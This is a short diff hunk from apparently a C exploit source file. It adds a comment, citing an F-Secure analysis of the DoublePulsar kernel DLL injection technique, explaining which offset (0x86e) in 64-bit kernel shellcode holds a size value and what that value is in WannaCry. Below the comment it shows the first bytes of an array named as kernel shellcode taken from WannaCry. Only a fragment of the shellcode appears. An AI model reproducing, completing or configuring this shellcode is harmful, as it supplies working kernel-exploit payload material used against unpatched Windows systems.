@@ -18,6 +18,15 @@ Will come back to find where in the shellcode the offset is for values
 0x8A, 0xDF, 0x01 / \x8A\xDF\x01
 */
 
+/*
+https://blog.f-secure.com/analyzing-the-doublepulsar-kernel-dll-injection-technique/
+Write <VALUE HERE> bytes of memory into this region from a later part of the kernel payload starting “SUWVATUAA”
+
+the shellcode goes to offset 0x86e -> example value: 0x12458a bytes
+this value in Wannacry is: 0x50D800 + 3978
+or KernelShellcode[2158] = 0x50D800 + 3978;
+*/
+
 unsigned char sixtyforbit_kernel_shellcode_from_wannacry[] =
 {
   0x48, 0x89, 0xE0, 0x66, 0x83, 0xE4, 0xF0, 0x41, 0x57, 0x41, 
